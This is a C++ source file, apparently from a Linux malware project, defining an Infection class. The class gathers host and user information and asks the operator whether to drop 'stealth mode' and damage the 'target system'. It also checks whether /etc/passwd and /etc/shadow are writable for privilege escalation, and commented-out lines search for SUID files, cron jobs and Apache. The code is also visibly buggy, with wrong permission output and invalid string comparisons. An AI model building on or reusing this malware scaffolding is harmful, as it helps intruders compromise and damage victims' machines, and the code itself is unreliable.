#include "Infection.h"

FileInformations Infection::GetFileInformations(const char* fileName){
	struct stat fileMetaInformations;
	struct FileInformations infos;
	//printf("[+] File Informations : %s\n", fileName);
	if(stat(fileName, &fileMetaInformations) < 0){
		return infos;
	}
	infos.filePermissions.append(S_ISDIR(fileMetaInformations.st_mode) ? "d" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IRUSR) ? "r" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IWUSR) ? "w" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IXUSR) ? "x" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IRGRP) ? "r" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IWGRP) ? "w" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IXGRP) ? "x" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IROTH) ? "r" : "w");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IWOTH) ? "w" : "-");
	infos.filePermissions.append((fileMetaInformations.st_mode & S_IXOTH) ? "x" : "-");
	//File Name
	infos.fileNameAndDir = fileName;
	//File Other Informations
	infos.fileSize = fileMetaInformations.st_size;
	infos.fileLinks = fileMetaInformations.st_nlink;
	infos.fileiNode = fileMetaInformations.st_ino;
	//File User and group
	struct passwd *fileUser = getpwuid(fileMetaInformations.st_uid);
	if(fileUser != 0){
		infos.fileUserOwner = fileUser->pw_name;
	} else {
		log2File("ERROR-logs.txt", "Can't get fileUserOwner for file: " + infos.fileNameAndDir);
	}
	struct group *fileGroup = getgrgid(fileMetaInformations.st_gid);
	if(fileGroup != 0){
		infos.fileGroupOwner = fileGroup->gr_name;
	} else {
		log2File("ERROR-logs.txt", "Can't get fileGroupOwner for file: " + infos.fileNameAndDir);
	}
	return infos;	
}

void Infection::askForPrivilegeEscalation(){
	if(user != "root"){
		std::string answer2PE = {""};
		while(true){
			printf("\033[1;32m[+] Would you like to try to escalate your privileges?\033[0m \033[1;31m(The infection may take much more time !)\033[0m\n");
			printf("\033[1;32mPlease use the following format for your  answer (y/Y/yes/YES | n/N/no/NO) : \033[0m");
			std::cin >> answer2PE;
			if(answer2PE == "YES" || answer2PE == "NO" || answer2PE == "Y" || answer2PE == "N" || answer2PE == "yes" || answer2PE == "no" || answer2PE == "y" || answer2PE == "n"){
				if(answer2PE == "YES" || answer2PE == "yes" || answer2PE == "y" || answer2PE == "Y"){
					printf("\033[1;32m[+] Attempting to find Privilege Escalation Vectors and Potentially Exploit it !\033[0m\n");
					tryPrivilegeEscalation = true;
					break;
				} else if(answer2PE == "NO" || answer2PE == "no" || answer2PE == "n" || answer2PE == "N"){
					printf("\033[1;32m[+] Skipping the search for Privilation Escalation Vectors !\n\033[0m");
					tryPrivilegeEscalation  = false;
					break;
				}
			} else {
				system("clear");
				printf("\033[1;31m[-] Please enter a valid value !\033[0m\n");
				system("sleep 2.5");
				system("clear");
			}
		}	 
	} else {
		printf("\033[1;32m[+] User root detected skipping Privilege Escalation...\033[0m\n");
		tryPrivilegeEscalation = false;
	}
}

bool Infection::askForNoStealthMode(){
	std::string answer2StealthMode{""};
	while(true){
		system("clear");
		printf("\033[1;32m[+] Would you like to disable Stealth Mode and really F#!$ your target system ?\033[0m \n");
		printf("\033[1;32mPlease use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : \033[0m");
		std::cin >> answer2StealthMode;
		if(answer2StealthMode == "YES" || answer2StealthMode == "NO" || answer2StealthMode == "Y" || answer2StealthMode == "N" || answer2StealthMode == "yes" || answer2StealthMode == "no" || answer2StealthMode == "y" || answer2StealthMode == "n"){
			if(answer2StealthMode == "YES" || answer2StealthMode == "yes" || answer2StealthMode == "y" || answer2StealthMode == "Y"){
				std::string confirm{""};
				system("clear");
				printf("\033[1;31;40m [+] Are you sure you want to continue ? (The damage caused by the malware are not irreversible) : \033[0m \n");
				printf("\033[1;32mPlease use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : \033[0m");
				std::cin >> confirm;
				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
					system("clear");
					printf("\033[1;32m[+] Stealth Mode Disabled, the user will clearly notice that something happens to his system but i will try to obfuscate our presence as much as possible !\033[0m\n");
					return stealthEnabled = false;
				} else if(confirm == "NO" || confirm == "no" || confirm == "n" || confirm == "N") {
					system("clear");
					printf("\033[1;32m[+] Stealth Mode Enabled, *shhhhhh*\n\033[0m");
					return stealthEnabled = true;
				}		
			} else if(answer2StealthMode == "NO" || answer2StealthMode == "no" || answer2StealthMode == "n" || answer2StealthMode == "N"){
				system("clear");
				printf("\033[1;32m[+] Stealth Mode Enabled, *shhhhhh*\n\033[0m");
				return stealthEnabled = true;
			}		
		} else{
				system("clear");
				printf("\033[1;31m[-] Please enter a valid value !\033[0m\n");
				system("sleep 2.5");
				system("clear");
		}
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("\033[1;31m%s\033[0m", errorMESSAGE);
	}
	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		printf("\033[1;31m%s\033[0m\n", buffer);
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE, const char* successMessage){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("\033[1;31m%s\033[0m", errorMESSAGE);
	}
	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		printf("%s \033[1;31m %s\033[0m", successMessage,buffer);
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE, const char* successMessage, const char* vOutput){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("\033[1;31m%s\033[0m", errorMESSAGE);
		log2File("logs.txt", errorMESSAGE);
	}

	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		if(vOutput == "KernelRelease"){
			if(buffer != ""){
				KernelRelease = buffer;
				printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
				log2File("logs.txt", successMessage + ' ' + *buffer);
			}
		} else if(vOutput == "KernelVersion"){
			if(buffer != ""){
				KernelVersion = buffer;
				printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
				log2File("logs.txt", successMessage + ' ' + *buffer);
			}
		} else if(vOutput == "suidFiles") {
			if(buffer != ""){
				printf("\t\033[1;32m- %s\033[0m", buffer);
				//TODO : Log2File
			}
		} else if(vOutput == "whoami"){
			if(buffer !=+ ""){
				user = buffer;
				std::cout << "size" << user[1];
				user.pop_back();
				//useless printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
				log2File("logs.txt", successMessage + ' ' + *buffer);
			}
		}else if(vOutput == "findApache"){
			if(buffer != ""){
				printf("[+] Found Package : %s", buffer);
				log2File("logs.txt", "[+] Found Package : " + *buffer);
				isApache2Present = true;
			} else {
				printf("[-] Apache not found on the system !");
				log2File("logs.txt", "[-] Apache not found on the system");
				isApache2Present = false;
			}
		} else if(vOutput == "localeLanguage"){
			localLanguage = buffer;
			printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
			log2File("logs.txt", successMessage + ' ' + *buffer);
		} else if(vOutput == "timezone"){
			localTimeZone = buffer;
			printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
			log2File("logs.txt", successMessage + ' ' + *buffer);
		} else {
			printf("%s \033[1;31m %s\033[0m", successMessage, buffer);
			log2File("logs.txt", successMessage + ' ' + *buffer);
		}
	}
}

void Infection::GetLinuxVersion(){
	//Get the version of the linux target
	//Current User
	const char* currentUserErrorMessage = "\033[1;31m[-] Failed to obtain the current user name\033[0m";
	const char* currentUserSuccessMessage = "\033[1;32m[+] Current User :\033[0m";
	runLocalCommand("whoami", currentUserErrorMessage, currentUserSuccessMessage, "whoami");
	//User and group informations
	//const char* currentUserGroupErrorMessage = "\033[1;31m[-] Failed to obtain the user and group information\033[0m";
	//const char* currentUserGroupSuccessMessage = "\033[1;32m[+] User and Group Informations :\033[0m";
	//runLocalCommand("id", currentUserGroupErrorMessage, currentUserGroupSuccessMessage, "id");
	//Kernel Release
	//const char* kernelReleaseErrorMessage = "\033[1;31m[-] Failed to obtain Kernel Release\033[0m";
	//const char* kernelReleaseSuccessMessage = "\033[1;32m[+] Kernel Release :\033[0m";
	//runLocalCommand("uname -r", kernelReleaseErrorMessage, kernelReleaseSuccessMessage, "KernelRelease");
	//Locale Language on the system
	//const char* localLangErrorMessage = "\033[1;31m[+] Can't retrieve System Local Language\033[0m";
	//const char* localLangSuccessMessage = "\033[1;32m[+] System Local Language :\033[0m";
	//runLocalCommand("localectl | grep System | cut -d ' ' -f6 | cut -d '=' -f2", localLangErrorMessage, localLangSuccessMessage, "localeLanguage");
	//const char* timeZoneErrorMessage = "\033[1;31m[+] Can't retrieve Timezone\033[0m";
	//const char* timeZoneSuccessMessage = "\033[1;32m[+] Timezone :\033[0m";
	//runLocalCommand("cat /etc/timezone", timeZoneErrorMessage, timeZoneSuccessMessage, "timezone");
	//KernelVersion [Kind of useless right now]
	//const char* kernelFullErrorMessage = "[-] Failed to obtain Kernel Version";
	//const char* kernelFullSuccessMessage = "[+] Kernel Version :";
	//runLocalCommand("uname -v", kernelFullErrorMessage, kernelFullSuccessMessage, "KernelVersion");
	//Distribution Release Number
	//const char* distributionReleaseNumberErrorMessage = "\033[1;31m[-] Failed to obtain Kernel Distribution Number\033[0m";
	//const char* distributionReleaseNumberSuccessMessage = "\033[1;32m[+] Kernel Release Number :\033[0m";
	//runLocalCommand("lsb_release -r -s", distributionReleaseNumberErrorMessage, distributionReleaseNumberSuccessMessage, "KernelVersion");
	//APACHE2 Detection
	//const char* apacheDetectionErrorMessage = "\033[1;31m[-] Couldn't search apache2\033[0m";
	//const char* apacheDetectionSuccessMessage = "\033[1;32m[+] Apache2 Found on the victim system !\033[0m";
	//runLocalCommand("dpkg --get-selections | grep apache2 | cut -d '	' -f1", apacheDetectionErrorMessage, apacheDetectionSuccessMessage, "findApache");
	//Cron jobs
	//printf("[+] Cron Jobs :\n");
	//const char* cronJobsErrorMessage = "\033[1;31m[-] Failed to obtain the Cron Jobs\033[0m";
	//const char* cronJobsSuccessMessage = "\033[1;32m[+] Cron Jobs successfully retrieved !\033[0m";
	//runLocalCommand("crontab -l", cronJobsErrorMessage, cronJobsSuccessMessage);
	//SUID Files
	//const char* suidFilesErrorMessage = "\033[1;31m[-] Failed to obtain SUID Files\033[0m";
	//const char* suidFilesSuccessMessage = "\033[1;32m[+] SUID Files :\033[0m";
	//if(tryPrivilegeEscalation){
	//	printf("\033[1;32m[+] SUID Files :\033[0m\n");
	//	runLocalCommand("find / -type f -perm -u=s 2>/dev/null", suidFilesErrorMessage, suidFilesSuccessMessage, "suidFiles");
	
	
	
	//Get Linux Informations through the uname command
	struct utsname unameInformation;
	if(uname(&unameInformation) == 1){
		log2File("ERROR-logs.txt", "Can't get system informations !");
		return;
	}
	printf("%s\n", unameInformation.sysname);
	printf("%s\n", unameInformation.release);
	printf("%s\n", unameInformation.machine);
	printf("%s\n", unameInformation.version);
	printf("%s\n", unameInformation.nodename);
	#ifdef _GNU_SOURCE
		printf("%s\n", unameInformation.domainname);
	#endif
}

bool Infection::startInfection(){
	//FileInformations test;
	//test = Infection::GetFileInformationsPE("/etc/passwd");
	this->GetLinuxVersion();
	this->askForNoStealthMode();
	this->askForPrivilegeEscalation();
	//Start Privilege Escalation
	if(tryPrivilegeEscalation){
		bool EtcPasswd = this->isEtcPasswdWriteable();
		bool EtcShadow = this->isEtcShadowWriteable();
	}
	
	//LOG
	
	/*if(std::experimental::filesystem::exists("logs.txt")){
		Infection::log2File("logs.txt", *user + " added content to log file.");
	} else {
		Infection::log2File("logs.txt", *user + " created log file.");
	}*/

	//Writing test
	//Infection::write2File("TEST.txt", "I am making tests BOW !");
	//Ask for no stealth mode
	//Ask for privileges
  	//GetLinuxVersioni9u
	//Enumerate adapters;
	Networking::enumerateAdapters();
	return true;
}
